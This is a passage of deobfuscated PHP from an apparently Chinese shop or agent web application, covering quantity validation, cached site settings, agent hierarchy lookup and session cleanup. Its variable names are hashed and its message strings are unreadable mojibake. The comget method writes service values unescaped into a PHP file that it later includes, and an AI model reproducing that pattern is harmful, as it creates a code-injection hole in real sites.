																				if ( strpos( ",".$R355ef3fa24['qtylist'].",", ",".$R66b0d9d6f1."," ) === false )
																				{
																								return "���ã���ѡ�������� ".$R355ef3fa24['qtylist']." �еĶ�Ӧ����������ǰѡ�������Ϊ ".$R66b0d9d6f1." ��";
																				}
																}
																else
																{
																				$R7b5951700d = $R355ef3fa24['qtymax'];
																				$R0cdee13a13 = $R355ef3fa24['qtymin'];
																				if ( $R7b5951700d < $R66b0d9d6f1 )
																				{
																								return "���ã����ι���������Ϊ ".$R7b5951700d." ��������ѡ������������ǰѡ�������Ϊ ".$R66b0d9d6f1."��";
																				}
																				if ( $R66b0d9d6f1 < $R0cdee13a13 )
																				{
																								return "���ã����ι������С��Ϊ ".$R0cdee13a13." ��������ѡ������������ǰѡ�������Ϊ ".$R66b0d9d6f1."��";
																				}
																}
												}
												if ( $R56ea904d53['ptype'] == 1 || $R56ea904d53['ptype'] == 2 )
												{
																$R355ef3fa24['v'] = explode( ",", $R355ef3fa24['v'] );
																$R355ef3fa24['txt'] = explode( ",", $R355ef3fa24['txt'].",,,," );
																$Rb24f2e2c35 = array( "cztype", "czarea1", "czarea2", "czother" );
																
																for ( $Ra16d228039 = 0;	$Ra16d228039 < 4;	$Ra16d228039++	)
																{
																				if ( !isset( $R355ef3fa24['v'][$Ra16d228039] ) && !( $R355ef3fa24['v'][$Ra16d228039] == 1 ) && !( $R56ea904d53[$Rb24f2e2c35[$Ra16d228039]] == "" ) )
																				{
																								return "����ѡ��".$R355ef3fa24['txt'][$Ra16d228039]."��";
																				}
																}
												}
								}
								else
								{
												return "����ͨ�Ŵ����µ�ʧ�ܣ�";
								}
								return "-1";
				}

				public function CheckServer( )
				{
								$R1867fa760f = factory::getservice( "sversion" );
								$R808b89ba0e = $R1867fa760f->IVer_CheckServer( array( ) );
								if ( !$R808b89ba0e )
								{
												$this->Alert( "����ͨ�Ŵ����µ�ʧ�ܣ�" );
												$this->HistoryGo( );
								}
				}

				public function GetMainSite( $R4f4c775ba2 )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R30b2ab8dc1 = $this->GetWebCache( );
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "./content/".$cache."/site/u_base_setting.php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																return true;
												}
												else
												{
																include( $R1ed7ad9990 );
												}
								}
								return $R30b2ab8dc1[$R4f4c775ba2."site"] != "" ? $R30b2ab8dc1[$R4f4c775ba2."site"] : $R30b2ab8dc1['website'];
				}

				public function GetRankType( )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R30b2ab8dc1 = $this->GetWebCache( );
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "./content/".$cache."/site/u_base_setting.php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																return true;
												}
												else
												{
																include( $R1ed7ad9990 );
												}
								}
								$Rcc5c6e696c = explode( "|", $R30b2ab8dc1['config'] );
								$R30aa8c1852 = count( $Rcc5c6e696c );
								if ( 20 < $R30aa8c1852 )
								{
												$R808b89ba0e = $Rcc5c6e696c[20];
								}
								else
								{
												$R808b89ba0e = 0;
								}
								return $R808b89ba0e == 0 ? true : false;
				}

				public function AutoAdjustPrice( )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R30b2ab8dc1 = $this->GetWebCache( );
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "../content/".$cache."/site/u_base_setting.php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																return true;
												}
												else
												{
																include( $R1ed7ad9990 );
												}
								}
								$R2e6e92499a = $R30b2ab8dc1['config'];
								$R7fd2e8ffde = explode( "|", $R2e6e92499a );
								if ( 21 < count( $R7fd2e8ffde ) )
								{
												$R558acfa73f = $R7fd2e8ffde[21];
								}
								else
								{
												$R558acfa73f = 1;
								}
								return $R558acfa73f;
				}

				public function GetSysById( $R5b92e56774, $R273ac57c7c = 0 )
				{
								global $masterid;
								if ( $masterid == 0 )
								{
												$R30b2ab8dc1 = $this->GetWebCache( );
								}
								else
								{
												global $cache;
												$R1ed7ad9990 = "./content/".$cache."/site/u_base_setting.php";
												if ( !file_exists( $R1ed7ad9990 ) )
												{
																return $R273ac57c7c;
												}
												else
												{
																include( $R1ed7ad9990 );
												}
								}
								$R2e6e92499a = $R30b2ab8dc1['config'];
								$R7fd2e8ffde = explode( "|", $R2e6e92499a );
								if ( $R5b92e56774 < count( $R7fd2e8ffde ) )
								{
												$R558acfa73f = $R7fd2e8ffde[$R5b92e56774];
								}
								else
								{
												$R558acfa73f = $R273ac57c7c;
								}
								return $R558acfa73f;
				}

				public function GetAgentBoss( $R2a51483b14 )
				{
								$R9aa102385f = $this->GetAgentCache( $R2a51483b14 );
								$Rac9b8532b8 = $R9aa102385f['parentid'];
								$R026f0167b4 = array( );
								if ( 0 < $Rac9b8532b8 )
								{
												$R026f0167b4[] = $Rac9b8532b8;
								}
								while ( 0 < $Rac9b8532b8 )
								{
												$R2195dadd9d = $this->GetAgentCache( $Rac9b8532b8 );
												$Rac9b8532b8 = $R2195dadd9d['parentid'];
												if ( 0 < $Rac9b8532b8 )
												{
																$R026f0167b4[] = $Rac9b8532b8;
												}
								}
								return $R026f0167b4;
				}

				public function comget( $R63bede6b19 )
				{
								$Rd0fd860666 = array( );
								global $masterid;
								if ( $masterid == 0 )
								{
												$R929cf63f35 = SITECACHE."ucom1.php";
								}
								else
								{
												global $cache;
												$R929cf63f35 = "./content/".$cache."/site/ucom.php";
								}
								if ( file_exists( $R929cf63f35 ) )
								{
												include( $R929cf63f35 );
												$Rd0fd860666 = $Rd0fd860666;
								}
								if ( !isset( $Rd0fd860666[$R63bede6b19] ) )
								{
												$Rf9fa7b35cf = factory::getservice( "ucom" );
												$R2f6ef52cdb = $Rf9fa7b35cf->IUCom_Get( array(
																"com" => $R63bede6b19
												) );
												$Rd0fd860666[$R63bede6b19] = $R2f6ef52cdb;
												$Re82ee9b121 = " \$Rd0fd860666 = array(";
												$R026f0167b4 = array( );
												foreach ( $Rd0fd860666 as $Ra09fe38af3 => $Ra3d52e52a4 )
												{
																$R026f0167b4[] = "'".$Ra09fe38af3."' => '".$Ra3d52e52a4."'";
												}
												$Re82ee9b121 = "<?php ".chr( 10 ).$Re82ee9b121.implode( ",", $R026f0167b4 ).");".chr( 10 )."?>";
												file_put_contents( $R929cf63f35, $Re82ee9b121 );
												return $R2f6ef52cdb;
								}
								else
								{
												return $Rd0fd860666[$R63bede6b19];
								}
				}

				public function GetCanTran( )
				{
								$R808b89ba0e = $this->GetSysById( 23, 0 );
								return $R808b89ba0e == 0 ? false : true;
				}

				public function SetSessDir( )
				{
								$R09a3346376 = DATACACHE."session".DS."f.php";
								if ( file_exists( $R09a3346376 ) )
								{
												include( $R09a3346376 );
												if ( $R6b6e98cde8 == 1 )
												{
																session_save_path( DATACACHE."session" );
																ini_set( "session.gc_probability", 1 );
																ini_set( "session.gc_divisor", 1 );
												}
								}
				}

				public function SetSessDirFile( $Rdddcb1881f = 0 )
				{
				}

				public function SessClear( $R714ca9eb87 = "" )
				{
								if ( $R714ca9eb87 == "" )
								{
												return;
								}
								$R9c25b10d53 = dir( $R714ca9eb87 );
								while ( $R3244a15a51 = $R9c25b10d53->read( ) )
								{
												$R3656889a44 = $R714ca9eb87."/".$R3244a15a51;
												if ( is_file( $R3656889a44 ) && $R3244a15a51 != "f.php" )
												{
																@unlink( $R3656889a44 );
												}
								}
								$R9c25b10d53->close( );
				}

}

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
?>
